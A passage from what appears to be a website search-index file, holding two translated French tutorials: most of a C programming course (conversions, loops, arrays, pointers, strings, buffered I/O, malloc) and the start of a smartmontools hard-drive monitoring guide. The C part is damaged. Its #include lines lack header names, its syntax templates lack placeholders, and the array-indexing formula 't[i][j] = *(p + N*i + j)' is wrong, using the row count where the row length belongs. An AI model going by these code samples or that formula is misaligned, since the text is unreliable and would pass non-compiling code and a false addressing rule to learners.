Information Interchange), which is a character set that uses only 7 bits and is the basis of many popular codes today, the character ‘A’ is represented by code 65, the character ‘a’ by 97 and ‘0’ by 48. Alas, even ASCII does not define the C language. Indeed, if C depended on a particular character set, it would then not be totally portable. Nevertheless, the standard defines a certain number of characters that any environment compatible with C must possess, among which are the 26 letters of the Latin alphabet (actually 52 since we differentiate uppercase and lowercase), the 10 decimal digits, the characters # \u003c \u003e ( ) etc. The programmer (but not the compiler) does not need to know how these characters are represented in the character set of the environment. So the standard does not define a character set but only a set of characters that each compatible environment is free to implement in its own way (plus any characters specific to that environment). The only constraint imposed is that their value must be able to fit in a char.\nConcerning the escape technique, also know that you can insert octal (starting with 0) or hexadecimal (starting with x) code after the escape character \\ to get a character whose code in the character set is given. Hexadecimal is by far the most used. For example: ‘\\x30’, ‘\\x41’, ‘\\x61’, … And finally for characters with code 0, 1, … up to 7, we can use the shortcuts ‘\\0’, ‘\\1’, … ‘\\7’.\nOverflow occurs when trying to assign to an lvalue a value larger than it can hold. For example, by assigning a 32-bit value to a variable that can only hold 16 bits.\nConversions linkImplicit linkIn the C language, implicit conversion rules apply to data that make up a complex expression when they are not of the same type (integer with a float, short integer with long integer, signed integer with an unsigned integer, etc.). For example, in the expression:\n'A' + 2 ‘A’ is of type char and 2 of type int. In this case, ‘A’ is first converted to int before the expression is evaluated. The result of the operation is of type int (because an int + an int gives an int). Here, it equals 67 (65 + 2). In fact, char and short are always systematically converted to int, i.e., in adding two char for example, both are first converted to int before being added, and the result is an int (not a char). An unsigned char will be converted to an unsigned int, and so on.\nAs a general rule: the “weakest” type is converted into the “strongest” type. For example, integers are weaker than floats, so 1 mixed with a float for example will first be converted to 1.0 before the operation actually takes place.\nThe compiler converts from lower rank to higher rank (= promotion):\nchar \u003c short \u003c int \u003c long \u003c float \u003c double Explicit (cast) linkSimply specify the destination type in parentheses in front of the expression to convert. For example:\nfloat f; f = (float)3.1416; In this example, we explicitly converted 3.1416, which is of type double, to float. When a float is assigned to an integer, only the integer part, if it can be represented, is retained.\nInstructions linkif linkAllows for conditional choices. The syntax of the instruction is as follows:\nif ( ) else An if instruction may not have an else. When there are several nested if instructions, an else always relates to the last if followed by one and only one instruction. For example: let’s write a program that compares two numbers.\n#include int main() { int a, b; printf(\"This program compares two numbers.\\n\"); printf(\"Enter the value of a: \"); scanf(\"%d\", \u0026a); printf(\"Enter the value of b: \"); scanf(\"%d\", \u0026b); if (a \u003c b) printf(\"a is smaller than b.\\n\"); else if (a \u003e b) printf(\"a is greater than b.\\n\"); else printf(\"a equals b.\\n\"); return 0; } do linkAllows to perform a loop. The syntax of the instruction is as follows:\ndo while ( ); The do instruction allows to execute an instruction as long as is true. The test is done after each execution of the instruction. Here is a program that displays “Hello” 10 times.\n#include int main() { int nb_lignes_affichees = 0; do { printf(\"Bonjour.\\n\"); nb_lignes_affichees++; } while (nb_lignes_affichees \u003c 10); return 0; } while linkAllows to perform a loop. The syntax of the instruction is as follows:\nwhile ( ) The while instruction allows to execute an instruction as long as is true. The test is done before each execution of the instruction. So if the condition () is false from the start, the loop will not be executed.\nfor linkAllows to perform a loop. The syntax of the instruction is as follows:\nfor ( ; ; ) It is practically identical to:\n; while ( ) { } For example, let’s write a program that displays the multiplication table for 5.\n#include int main() { int n; for(n = 0; n \u003c= 10; n++) printf(\"5 x %2d %2d\\n\", n, 5 * n); return 0; } The %2d format displays an integer with a minimum of 2 characters (the remaining space will be filled with spaces).\nbreak linkAllows to immediately exit a loop or a switch. The syntax of this instruction is:\nbreak; Switch and case linkThese instructions allow to avoid if instructions that are too nested as illustrated by the following example:\n#include int main() { int n; printf(\"Enter an integer: \"); scanf(\"%d\", \u0026n); switch(n) { case 0: printf(\"Case of 0.\\n\"); break; case 1: printf(\"Case of 1.\\n\"); break; case 2: case 3: printf(\"Case of 2 or 3.\\n\"); break; case 4: printf(\"Case of 4.\\n\"); break; default: printf(\"Unknown case.\\n\"); } return 0; } Continue linkIn a loop, allows to immediately move to the next iteration. For example, let’s modify the multiplication table program so that we display nothing for n = 4 or n = 6.\n#include int main() { int n; for(n = 0; n \u003c= 10; n++) { if ((n == 4) || (n == 6)) continue; printf(\"5 x %2d %2d\\n\", n, 5 * n); } return 0; } Return linkAllows to terminate a function. The syntax of this instruction is as follows:\nreturn ; /* terminates the function and returns */ or:\nreturn; /* terminates the function without specifying a return value */ Arrays, pointers, and character strings linkAn array is a variable that groups one or more pieces of data of the same type. Access to an element of the array is done by an index system, the index of the first element being 0. For example:\nint t[10]; declares an array of 10 elements (of type int) whose name is t. The elements of the array go from t[0], t[1], t[2] … to t[9]. t is a variable of type array, more precisely (in our case), a variable of type array of 10 int (int [10]). The elements of the array are int. All the rules applying to variables also apply to the elements of an array.\nchar msg[ ] = \"bonjour\"; char msg[8] = \"bonjour\"; // the 8 corresponds to the number of letters in the word and bonjour plus the '\\0'. Initialization linkYou can initialize an array using braces. For example:\nint t[10] = {0, 10, 20, 30, 40, 50, 60, 70, 80, 90}; Of course, we are not obliged to initialize all the elements, we could have stopped after the 5th element for example, and in this case the other elements of the array will automatically be initialized to 0. Caution! an uninitialized local variable contains “anything”, not 0!\nWhen declaring an array with initialization, you can omit the number of elements because the compiler will calculate it automatically. Thus, the declaration:\nint t[] = {0, 10, 20, 30}; is strictly identical to:\nint t[4] = {0, 10, 20, 30}; Calculate the size of an array linkThe size of an array is obviously the number of elements in the array multiplied by the size of each element. Thus, the number of elements in an array is equal to its size divided by the size of an element. We then generally use the formula sizeof(t) / sizeof(t[0]) to know the number of elements of an array t. The macro defined below allows to calculate the size of an array:\n#define COUNT(t) (sizeof(t) / sizeof(t[0])) Multidimensions linkYou can also create a multidimensional array. For example:\nint t[10][3]; A multidimensional array is actually nothing but an array (one-dimensional array) whose elements are arrays. As in the case of one-dimensional arrays, the type of the elements of the array must be perfectly known. So in our example, t is an array of 10 arrays of 3 int, or to help you see more clearly:\ntypedef int TRIPLET[3]; TRIPLET t[10]; The elements of t go from t[0] to t[9], each being an array of 3 int.\nYou can of course create arrays with 3 dimensions, 4, 5, 6, …\nYou can also initialize a multidimensional array. For example:\nint t[3][4] = { {0, 1, 2, 3}, {4, 5, 6, 7}, {8, 9, 10, 11} }; Which we could also have simply written:\nint t[][4] = { {0, 1, 2, 3}, {4, 5, 6, 7}, {8, 9, 10, 11} }; Pointer Arithmetic linkIntroduction to address calculation linkHere is an example of a pointer:\nt[5] = '*'; In practice, we use a pointer to an element of the array, usually the first. This allows access to any element of the array by simple address calculation. As we said above: t + 1 is equivalent to \u0026(t[1]), t + 2 to \u0026(t[2]), etc.\nHere’s an example that shows one way to traverse an array:\n#include #define COUNT(t) (sizeof(t) / sizeof(t[0])) void Affiche(int * p, size_t nbElements); int main() { int t[10] = {0, 10, 20, 30, 40, 50, 60, 70, 80, 90}; Affiche(t, COUNT(t)); return 0; } void Affiche(int * p, size_t nbElements) { size_t i; for(i = 0; i \u003c nbElements; i++) printf(\"%d\\n\", p[i]); } Pointer arithmetic linkPointer arithmetic was born from the facts we established earlier. Indeed, if p points to an element of an array, p + 1 must point to the next element. So if the size of each element of the array is for example 4, p + 1 moves the pointer 4 bytes (where the next element is) and not one.\nSimilarly, since we should have (p + 1) - p = 1 and not 4, the difference between two addresses gives the number of elements between these addresses and not the number of bytes between these addresses. The type of such an expression is ptrdiff_t, which is defined in the file stddef.h.\nAnd finally, the notation p[i] is strictly equivalent to *(p + i).\nThis shows how important pointer typing is. However, there are so-called generic pointers capable of pointing to anything. Thus, the conversion of a generic pointer to a pointer of another type for example requires no cast and vice versa.\nGeneric pointers linkThe type of generic pointers is void *. Since these pointers are generic, the size of the data pointed to is unknown and pointer arithmetic therefore does not apply to them. Similarly, since the size of the pointed data is unknown, the indirection operator * cannot be used with these pointers, a cast is then mandatory. For example:\nint n; void * p; p = \u0026n; *((int *)p) = 10; /* p being now seen as an int *, we can then apply the operator *. */ Given that the size of any data is a multiple of that of a char, the type char * can also be used as a universal pointer. Indeed, a variable of type char * is a pointer to a byte, in other words it can point to anything. This proves to be practical sometimes (when you want to read the content of a memory byte by byte for example) but in most cases, it is always better to use generic pointers. For example, the conversion of an address of different type to char * and vice versa always requires a cast, which is not the case with generic pointers.\nIn printf, the format specifier %p allows to print an address (void *) in the format used by the system.\nAnd finally, there is a macro, NULL, defined in stddef.h, indicating that a pointer does not point anywhere. Its interest is therefore to allow to test the validity of a pointer and it is advised to always initialize a pointer to NULL.\nExample with a multidimensional array linkLet’s say:\nint t[10][3]; Let’s define the TRIPLET type by:\ntypedef int TRIPLET[3]; So as to have:\nTRIPLET t[10]; Seen from a pointer, t represents the address of t[0] (which is a TRIPLET) so the address of a TRIPLET. By doing t + 1, we move one TRIPLET, i.e., 3 int.\nOn the other hand, t can be seen as an array of 30 int (3 * 10 = 30), so we can access any element of t using a pointer to int.\nLet p be a pointer to int and let’s do:\np = (int *)t; We then have, numerically, the following equivalences:\nt p t + 1 p + 3 t + 2 p + 6 ... t + 9 p + 27 Now let’s take the 3rd TRIPLET of t, i.e., t[2].\nSince the first element of t[2] is at address t + 2 or p + 6, the second is at p + 6 + 1 and the third and last at p + 6 + 2. After this integer, we find ourselves at the first element of t[3], at p + 9.\nIn conclusion, for an array declared:\nt[N][M]; we have the formula:\nt[i][j] = *(p + N*i + j) /* or even p[N*i + j] */ Where obviously: p = (int *)t.\nAnd we can of course extend this formula for any dimension.\nCharacter strings linkBy definition, a character string, or simply: string, is a finite sequence of characters. For example, “Hello”, “3000”, “Hi!”, “EN 4”, … are character strings. In the C language, a constant of type character string is written between double quotes, exactly as in the examples given above.\nThe length of a string is the number of characters it contains. For example, the string “Hello” contains 5 characters (‘H’, ’e’, ’l’, ’l’, ‘o’). Its length is therefore 5. In C, the strlen function, declared in the file string.h, allows to obtain the length of a string passed as an argument. Thus, strlen(“Hello”) equals 5.\nRepresentation of character strings in C linkAs we have already mentioned above, constants of type character string are written in C between double quotes. In fact, the C language does not really have a character string type. A string is simply represented using an array of characters.\nHowever, functions manipulating strings must be able to detect the end of a given string. In other words, every character string must end with a character indicating the end of the string. This character is the ‘\\0’ character and is called the null character or end of string character. Its ASCII code is 0. Thus the string “Hello” is actually an array of characters whose elements are ‘H’, ’e’, ’l’, ’l’, ‘o’, ‘\\0’, in other words an array of 6 characters and we have “Hello”[0] = ‘H’, “Hello”[1] = ’e’, “Hello”[2] = ’l’, … “Hello”[5] = ‘\\0’. However, since it is a constant (character string constant), the content of the memory allocated for the string “Hello” cannot be modified.\nThe string manipulation functions of the C language standard library are mainly declared in the file string.h. Here is an example of using one of these functions:\n#include #include int main() { char t[50]; strcpy(t, \"Hello, world!\"); printf(\"%s\\n\", t); return 0; } In this example, the string t can contain at most 50 characters, including the end of string character. In other words, t can only contain 49 “normal” characters because a place must always be reserved for the end of string character: ‘\\0’. You can also of course initialize a string at the time of its declaration, for example:\nchar s[50] = \"Hello\"; Which is strictly equivalent to:\nchar s[50] = { 'H', 'e', 'l', 'l', 'o', '\\0'}; Since, seen from a pointer, the value of a string literal expression is nothing other than the address of its first element, you can use a simple pointer to manipulate a string. For example:\nchar * p = \"Hello\"; In this case, p points to the first element of the string “Hello”. However, as we have already said above, the memory allocated for the string “Hello” is read-only so you cannot write for example:\np[2] = '*'; /* Forbidden */ With an array, it is not the address in memory of the string that is stored, but the characters of the string, copied character by character. Since the memory used by the array is independent of that used by the source string, we can do what we want with our array. The strcpy function allows to copy a string to another memory location.\nThe following paragraph discusses string manipulation functions in C.\nstrcpy, strncpy link #include #include int main() { char t1[50], t2[50]; strcpy(t1, \"Hello, world!\"); strcpy(t2, \"*************\"); strncpy(t1, t2, 3); printf(\"%s\\n\", t1); return 0; } Caution! If t1 is not large enough to hold the string to copy, you will have a buffer overflow. A buffer is simply an area of memory used by a program to temporarily store data. For example, t1 is a buffer of 50 bytes. It is therefore the programmer’s responsibility not to pass anything to it! Indeed in C, the compiler assumes that the programmer knows what he is doing!\nThe strncpy function is used in the same way as strcpy. The third argument indicates the number of characters to copy. No end of string character is automatically added.\nstrcat, strncat linkThis will add characters to the end of an array:\n#include #include int main() { char t[50]; strcpy(t, \"Hello, world\"); strcat(t, \" from\"); strcat(t, \" strcpy\"); strcat(t, \" and strcat\"); printf(\"%s\\n\", t); return 0; } Which will give:\nHello, world from strcpy and strcat strlen linkReturns the number of characters in a string.\nstrcmp, strncmp linkWe don’t use the == operator to compare strings because it’s not the addresses we want to compare but the memory content. The strcmp function compares two character strings and returns:\nzero if the strings are identical a negative number if the first is “less than” (from a lexicographical point of view) the second and a positive number if the first is “greater than” (from the same point of view …) the second Thus, as an example, in the expression\nstrcmp(\"clandestin\", \"clavier\") The function returns a negative number because, ’n’ being smaller than ‘v’ (in the ASCII character set, it has nothing to do with the C language), “clandestin” is smaller than “clavier”.\nImplementation of some string manipulation functions linkWe will therefore implement two string manipulation functions, namely str_len and str_cpy, which will be used in the same way as their twins strlen and strcpy.\nsize_t str_len(char * t) { size_t len; for(len = 0; t[len] != '\\0'; len++) /* We do nothing, we just let it loop */ ; return len; } char * str_cpy(char * dest, char * source) { int i; for(i = 0; source[i] != '\\0'; i++) dest[i] = source[i]; dest[i] = '\\0'; return dest; } Notice the way we implemented the str_cpy function. You might have expected this function to return void and not a char *. Well, no! Many functions in the standard library also use this “convention”, which allows code of the type:\nchar s[50] = \"Hello\"; printf(\"%s\\n\", strcat(s, \" everyone!\")); Input/output (I/O) is not really part of the C language because these operations are dependent on the system. So to perform input/output operations in C, you have to in principle go through the low-level functionalities of the system. Nevertheless its standard library is provided with functions allowing to perform such operations in order to facilitate the writing of portable code. The functions and data types related to inputs/outputs are mainly declared in the file stdio.h (standard input/output).\nInput/output in C is done through logical entities, called streams, which represent objects external to the program, called files. A file can be opened in reading, in which case it is supposed to provide us with data (i.e., to be read) or opened in writing, in which case it is intended to receive data from the program. A file can be both open for reading and writing. Once a file is open, a stream is associated with it. An input stream is a stream associated with a file open for reading and an output stream a stream associated with a file open for writing.\nWhen the data exchanged between the program and the file are of text type, the need to define what we call a line is paramount. In C, a line is a sequence of characters ended by the end of line character (included): ‘\\n’. For example, when we type on the keyboard, a line corresponds to a sequence of characters ended by ENTER. Since the ENTER key ends a line, the character generated by this key is therefore, in standard C, the end of line character or ‘\\n’.\nWhen the system executes a program, three files are automatically opened:\nthe standard input, by default the keyboard the standard output, by default the screen (or console) and the standard error, by default associated with the screen (or console) You know the rest, for redirections to files (\u003c \u003e).\nRead a character, then display it linkThe getc macro allows you to read a character on an input stream. The putc macro allows you to write a character to an output stream. Here’s a simple program that shows how to use the getc and putc macros:\n#include int main() { int c; /* the character */ printf(\"Please type a character: \"); c = getc(stdin); printf(\"You typed: \"); putc(c, stdout); return 0; } You’re probably wondering why we used int rather than char in the declaration of c. Well simply because getc returns an int (same for putc which expects an argument of type int). But precisely: Why? Well because getc must be able not only to return the read character (a char) but also a value that must not be a char to signal that no character could be read. This value is EOF. It is defined in the stdio.h file. In these conditions, it is clear that we can use anything except a char as the return type of getc.\nOne of the most frequent cases where getc returns EOF is when we have encountered the end of the file. The end of a file is a point located beyond the last character of this file (if the file is empty, the beginning and end of the file are therefore confused). We are said to have encountered the end of a file after having attempted to read in this file while we are already at the end, not just after having read the last character. When stdin is associated with the keyboard, the notion of end of file loses its meaning a priori because the user can very well type anything at any time. However the execution environment (the operating system) generally offers a way to specify that there is no more character to provide (concretely, for us, this means that getc will return EOF). Under Windows for example, it is sufficient to type at the beginning of the line the combination of keys Ctrl + Z (inherited from DOS) and then validate by ENTER. Obviously, everything starts again at zero at the next read operation.\nThe getchar and putchar macros are used as getc and putc except that they operate only on stdin, respectively stdout. They are defined in stdio.h as follows:\n#define getchar() getc(stdin) #define putchar(c) putc(c, stdout) And finally fgetc is a function that does the same thing as getc (which can in fact be either a function or a macro…). Similarly fputc is a function that does the same thing as putc.\nEnter a character string linkIt is enough to read the characters present on the input stream (in our case: stdin) until we have reached the end of the file or the end of line character. We will have to provide as arguments of the function the address of the buffer intended to contain the character string entered and the size of this buffer to eliminate the risk of buffer overflow.\n#include char * saisir_chaine(char * lpBuffer, size_t nBufSize); int main() { char lpBuffer[20]; printf(\"Enter a character string: \"); saisir_chaine(lpBuffer, sizeof(lpBuffer)); printf(\"You typed: %s\\n\", lpBuffer); return 0; } char * saisir_chaine(char * lpBuffer, size_t nBufSize) { size_t nbCar = 0; int c; c = getchar(); while ((nbCar \u003c nBufSize - 1) \u0026\u0026 (c != EOF) \u0026\u0026 (c != '\\n')) { lpBuffer[nbCar] = (char)c; nbCar++; c = getchar(); } lpBuffer[nbCar] = '\\0'; return lpBuffer; } The scanf function also allows to enter a character string not containing any space (space, tab, etc.) thanks to the format specifier %s. It will therefore stop reading when it encounters a space (but before reading, it will first advance to the first character that is not a space). scanf finally adds the end of string character. The template allows to indicate the maximum number of characters to read (end of string character not included). When using scanf with the %s specifier (which asks to read a string without space), you should never forget to also specify the maximum number of characters to read (to be placed just before the s) otherwise the program will be open to buffer overflow attacks. Here is an example that shows the use of scanf with the %s format specifier:\n#include int main() { char lpBuffer[20]; printf(\"Enter a character string: \"); scanf(\"%19s\", lpBuffer); printf(\"You typed: %s\\n\", lpBuffer); return 0; } And finally, there is also a function, gets, declared in stdio.h, which allows to read a character string on stdin. However this function is to be proscribed because it does not allow to specify the size of the buffer that will receive the read string.\nRead a line with fgets linkThe fgets function allows to read a line (i.e., including the ‘\\n’) on an input stream and to place the read characters in a buffer. This function then adds the ‘\\0’ character. Example:\n#include int main() { char lpBuffer[20]; printf(\"Enter a character string: \"); fgets(lpBuffer, sizeof(lpBuffer), stdin); printf(\"You typed: %s\", lpBuffer); return 0; } In this example, two cases can arise:\nthe user enters a string containing at most 18 characters and then validates it all by ENTER, then all the characters of the line, including the end of line character, are copied into lpBuffer and then the end of string character is added the user enters a string containing more than 18 characters (i.e., \u003e= 19) and then validates it all by ENTER, then only the first 19 characters are copied to lpBuffer and then the end of string character is added Input/output mechanism in C linkInput/output in C is buffered, meaning that the data to be read (respectively to be written) are not directly read (respectively written) but are first placed in a buffer associated with the file. The proof, you have certainly noticed for example that when you enter data for the first time using the keyboard, these data will only be read once you have pressed the ENTER key. Then, all the read operations that follow will be done immediately as long as the ‘\\n’ character is still present in the read buffer, i.e., as long as it has not yet been read. When the ‘\\n’ character is no longer present in the buffer, you will have to press ENTER again to validate the input, and so on.\nWrite operations are less complicated, but there is still something that would be totally unfair not to talk about. As we have already said above, input/output in C is buffered i.e., passes through a buffer. In the case of a write operation, it may happen that we want at a certain moment to force the physical writing of the data present in the buffer associated with the file without waiting for the system to finally decide to do it. In this case, we will use the fflush function: In the case of an output stream, this function causes the immediate physical writing of the buffer being filled. It returns EOF in case of error, zero otherwise. According to the official C language standard, the effect of fflush on a stream that is not an output stream is undefined. But for most current libraries, calling this function on an input stream removes the characters available in the buffer. For example, in the frequent case where the standard input corresponds to the keyboard, the call fflush(stdin) makes all the characters already typed but not yet read by the program disappear.\nNote. If the physical file that corresponds to the indicated stream is an interactive organ, for example the screen of a workstation, then the fflush function is implicitly called in two very frequent circumstances:\nthe writing of the ‘\\n’ character which produces the emission of an end of line mark and the effective emptying of the buffer, the beginning of a read operation on the associated input unit (interactive input/output organs generally form pairs); thus, for example, a read at the keyboard causes the emptying of the write buffer to the screen. This allows a question to be effectively displayed before the user has to type the corresponding answer. Read safely from standard input linkFirst, let’s analyze the very small program below:\n#include int main() { char nom[12], prenom[12]; printf(\"Enter your last name: \"); fgets(nom, sizeof(nom), stdin); printf(\"Enter your first name: \"); fgets(prenom, sizeof(prenom), stdin); printf(\"Your last name is: %s\", nom); printf(\"And your first name: %s\", prenom); return 0; } In this program, if the user enters a name containing less than 10 characters and then validates by ENTER, then all the characters fit in nom and the program proceeds as planned. On the other hand, if the user enters a name containing more than 10 characters, only the first 11 characters will be copied to nom and characters are therefore still present in the keyboard buffer. So, when reading the first name, the characters still present in the buffer will immediately be read without the user having been able to enter anything. Here is a second example:\n#include int main() { int n; char c; printf(\"Enter a number (integer): \"); scanf(\"%d\", \u0026n); printf(\"Enter a character: \"); scanf(\"%c\", \u0026c); printf(\"The number you entered is: %d\\n\", n); printf(\"The character you entered is: %c\\n\", c); return 0; } When we ask scanf to read a number, it will move the pointer to the first non-blank character, read as long as it should read the characters that may appear in the expression of a number, then stop when it encounters an invalid character (space or letter for example).\nSo in the example above, the character will be read without the user’s intervention because of the presence of the ‘\\n’ character (which will then be the read character) due to the ENTER key pressed during the number input.\nThese examples show us that in general, we must always empty the keyboard buffer after each input, unless it is already empty of course. To empty the keyboard buffer, simply eat all the characters present in the buffer until we have encountered the end of line character or reached the end of the file. As an example, here is an improved version (with input buffer emptying after reading) of our saisir_chaine function:\nchar * saisir_chaine(char * lpBuffer, int nBufSize) { char * p; fgets(lpBuffer, nBufSize, stdin); p = lpBuffer + strlen(lpBuffer) - 1; if (*p == '\\n') *p = '\\0'; /* we overwrite the \\n */ else { /* We empty the read buffer of the stdin stream */ int c; c = getchar(); while ((c != EOF) \u0026\u0026 (c != '\\n')) c = getchar(); } return lpBuffer; } Dynamic memory allocation linkThe interest of dynamically allocating memory is felt when we want to create an array whose size we need is only known at execution time for example. In other words:\nint t[10]; ... /* END */ Can be replaced by:\nint * p; p = malloc(10 * sizeof(int)); ... free(p); /* free the memory when we no longer need it */ /* END */ The malloc and free functions are declared in the stdlib.h file. malloc returns NULL in case of failure. Here is an example that illustrates a good way to use them:\np = malloc(10 * sizeof(int)); if (p != NULL) { ... free(p); } else /* FAILURE */ The realloc function:\nvoid * realloc(void * memblock, size_t newsize); allows to “resize” a dynamically allocated memory (by malloc for example). If memblock equals NULL, realloc behaves like malloc. In case of success, this function then returns the address of the new memory, otherwise the NULL value is returned and the memory pointed to by memblock remains unchanged.\nint * p, * q; /* q: to test the return of realloc */ p = malloc(10 * sizeof(int)); if (p != NULL) { ... q = realloc(p, 20 * sizeof(int)); if (q != NULL) { p = q; ... } free(p); } ... Resources linkhttp://c.developpez.com/cours C in Action - O’Reilly\n"
            }
        );
    index.add(
            {
                id:  408 ,
                href: "\/Smartmontool_:_Surveillance_des_disques_dur\/",
                title: "Smartmontools: Hard Drive Monitoring",
                description: "How to install and configure Smartmontools to monitor hard drive health and performance on various Linux and BSD systems.",
                content: "Introduction linkSmartmontools is a tool for analyzing hard drives and their most critical physical characteristics. It consists of two parts: smartd daemon, which checks parameters every 30 minutes and writes the results to /var/log/syslog, and the smartctl command which requires root privileges and is used to display all the information.\nActivation / Installation of smartmontools linkDebian linkInstallation requires root privileges. The package name varies depending on your Debian version. The example below is for Sarge.\n\u003e aptitude install smartmontools Lecture des listes de paquets... Fait Construction de l'arbre des dependances... Fait Les NOUVEAUX paquets suivants seront installes : smartmontools 0 mis a jour, 1 nouvellement installes, 0 a enlever et 60 non mis a jour. Il est necessaire de prendre 222ko dans les archives. Apres depaquetage, 508ko d'espace disque supplementaires seront utilises. Reception de : 1 http://ftp.fr.debian.org unstable/main smartmontools 5.32-3 [222kB] 222ko receptionnes en 0s (272ko/s) Selection du paquet smartmontools precedemment deselectionne. (Lecture de la base de données... 67466 fichiers et repertoires deja installes.) Depaquetage de smartmontools (a partir de .../smartmontools_5.32-3_i386.deb) ... Parametrage de smartmontools (5.32-3) ... Not starting S.M.A.R.T. daemon smartd, disabled via /etc/default/smartmontools As you can see, the daemon has not been started immediately. You need to edit /etc/default/smartmontools and uncomment the lines start_smartd=yes and smartd_opts=\"--interval=1800\":\n# Defaults for smartmontools initscript (/etc/init.d/smartmontools) # This is a POSIX shell fragment # list of devices you want to explicitly enable S.M.A.R.T. for # not needed if the device is monitored by smartd # enable_smart=\"/dev/hda /dev/hdb\" # uncomment to start smartd on system startup start_smartd=yes # uncomment to pass additional options to smartd on startup smartd_opts=\"--interval=1800\" Once the changes are validated, start the daemon:\n/etc/init.d/smartmontools start Enabling S.M.A.R.T. for: /dev/hda /dev/hdb. Starting S.M.A.R.T. daemon: smartd. 23:21 root@revolution /# smartctl -a /dev/hda smartctl version 5.32 Copyright (C) 2002-4 Bruce Allen The smartd daemon will now regularly check your disk information and record it in your logs:\ncat /var/log/syslog | grep smartd Mar 17 10:48:34 slut smartd[990]: Configuration file /etc/smartd.conf was parsed, found DEVICESCAN, scanning devices And there you go, it’s ready.\nFreeBSD linkTo install smartmontools:\npkg_add -r smartmontool Then start it like this:\n/usr/local/etc/rc.d/smartd start Edit the /usr/local/etc/smartd.conf configuration and add this line (adapting to your email):\nDEVICESCAN -a -m my@mail.com Next, if we want smartd to start at every boot, add this line:\nsmartd_enable=\"YES\" Fine Tuning linkDebian linkTo fine-tune the smartmontools configuration, edit the /etc/smartd.conf file and look for the DEVICESCAN line to add your own settings, as in this example:\nDEVICESCAN -H -l error -l selftest -t -f -m admin@webank.fr -M exec /usr/bin/mail -s (S/../.././02|L/../../6/03) The DEVICESCAN directive indicates that you want to apply this configuration to all hard disks detected as SMART compatible on the system. It can be replaced by the name of a device /dev/hdx or /dev/sdx.\n/dev/hda -H -l error -l selftest -t -f -m admin@webank.fr -M exec /usr/bin/mail -s (S/../.././02|L/../../6/03) /dev/hdc -H -l error -l selftest -t -f -m admin@webank.fr -M exec /usr/bin/mail -s (S/../.././02|L/../../6/03) Adding this line to the configuration file allows sending an email to admin@domain.com using your system’s mail command. The -t option indicates that we want to be informed in case the “Pre-Fail” or “Old-age” attribute shows errors, if the health test (option -H) fails, or if the error and selftest logs evolve (-l). You can choose from a range of options to best adjust according to your needs. For example, you can deliberately ignore an attribute using the -I option. Adding the -I 194 option indicates that we want to receive an email in case of failure but ignoring attribute number 194 (temperature). The -s option allows you to define the periodicity of the tests to be performed (version \u003e5.30 required). In this example, we perform a short test (S/) every day at 2 a.m., and a long test every Saturday at 3 a.m. It’s also possible to modify the email that will be sent by smartd in case of failure by creating a script that will be called instead of /bin/mail.\nFreeBSD linkTo receive daily emails indicating the state of your disks, add this to the /etc/periodic.conf file:\ndaily_status_smart_devices=\"/dev/ad4 /dev/ad6 /dev/ad8 /dev/ad10 /dev/ad12\" Obviously, use your own devices.\nDiagnostics and Troubleshooting linkSince smartd writes to /var/log/syslog, it’s easy to search with a grep command as in the following example:\n\u003e grep smartd /var/log/syslog Mar 17 10:48:34 slut smartd[990]: Configuration file /etc/smartd.conf was parsed, found DEVICESCAN, scanning devices Mar 17 10:48:34 slut smartd[990]: Device: /dev/hda, opened Mar 17 10:48:34 slut smartd[990]: Device: /dev/hda, found in smartd database. Mar 17 10:48:35 slut smartd[990]: Device: /dev/hda, is SMART capable. Adding to \"monitor\" list. Mar 17 10:48:35 slut smartd[990]: Device: /dev/hdb, opened Mar 17 10:48:35 slut smartd[990]: Device: /dev/hdb, not ATA, no IDENTIFY DEVICE Structure Mar 17 10:48:35 slut smartd[990]: Monitoring 1 ATA and 0 SCSI devices Mar 17 10:48:35 slut smartd: Lancement smartd succeeded Mar 17 10:48:35 slut smartd[2421]: smartd has fork()ed into background mode. New PID=2421. Mar 17 13:48:35 slut smartd[2421]: Device: /dev/hda, SMART Prefailure Attribute: 8 Seek_Time_Performance changed from 246 to 247 Mar 17 15:48:35 slut smartd[2421]: Device: /dev/hda, SMART Prefailure Attribute: 8 Seek_Time_Performance changed from 247 to 246 Mar 17 17:18:35 slut smartd[2421]: Device: /dev/hda, SMART Prefailure Attribute: 8 Seek_Time_Performance changed from 246 to 247 How to interpret these lines? The drive shows a constant value that varies between 246 and 247. If the value suddenly changes from 247 to 500, this is abnormal behavior.\nUsing the smartctl command requires root privileges. Let’s look at the different attributes of the command.\nsmarctl -h smartctl version 5.33 [i386-redhat-linux-gnu] Copyright (C) 2002-4 Bruce Allen Home page is http://smartmontools.sourceforge.net/[1] Usage: smartctl [options] device h, --help, --usage Display this help and exit i, --info Show identity information for device a, --all Show all SMART information for device smartctl -i /dev/hda === START OF INFORMATION SECTION === Device Model: Maxtor 6E040L0 Serial Number: E1KTPXFE Firmware Version: NAR61590 User Capacity: 41,110,142,976 bytes Device is: In smartctl database [for details use: -P show] ATA Version is: 7 ATA Standard is: ATA/ATAPI-7 T13 1532D revision 0 Local Time is: Thu Mar 17 22:21:52 2005 CET SMART support is: Available - device has SMART capability. SMART support is: Enabled smartctl -a /dev/hda === START OF READ SMART DATA SECTION === SMART overall-health self-assessment test result: PASSED General SMART Values: Offline data collection status: (0x82) Offline data collection activity was completed without error. Auto Offline Data Collection: Enabled. Self-test execution status: ( 0) The previous self-test routine completed without error or no self-test has ever been run. Total time to complete Offline data collection: (1021) seconds. Offline data collection capabilities: (0x5b) SMART execute Offline immediate. Auto Offline data collection on/off support. Suspend Offline collection upon new command. Offline surface scan supported. Self-test supported. No Conveyance Self-test supported. Selective Self-test supported. SMART capabilities: (0x0003) Saves SMART data before entering power-saving mode. Supports SMART auto save timer. Error logging capability: (0x01) Error logging supported. No General Purpose Logging support. Short self-test routine recommended polling time: ( 2) minutes. Extended self-test routine recommended polling time: ( 17) minutes. SMART Attributes Data Structure revision number: 16 Vendor Specific SMART Attributes with Thresholds: ID# ATTRIBUTE_NAME FLAG VALUE WORST THRESH TYPE UPDATED WHEN_FAILED RAW_VALUE 3 Spin_Up_Time 0x0027 252 252 063 Pre-fail Always - 2463 4 Start_Stop_Count 0x0032 253 253 000 Old_age Always - 18 5 Reallocated_Sector_Ct 0x0033 253 253 063 Pre-fail Always - 0 6 Read_Channel_Margin 0x0001 253 253 100 Pre-fail Offline - 0 7 Seek_Error_Rate 0x000a 253 252 000 Old_age Always - 0 8 Seek_Time_Performance 0x0027 247 238 187 Pre-fail Always - 46214 9 Power_On_Minutes 0x0032 241 241 000 Old_age Always - 950h+09m 10 Spin_Retry_Count 0x002b 252 252 157 Pre-fail Always - 0 11 Calibration_Retry_Count 0x002b 253 252 223 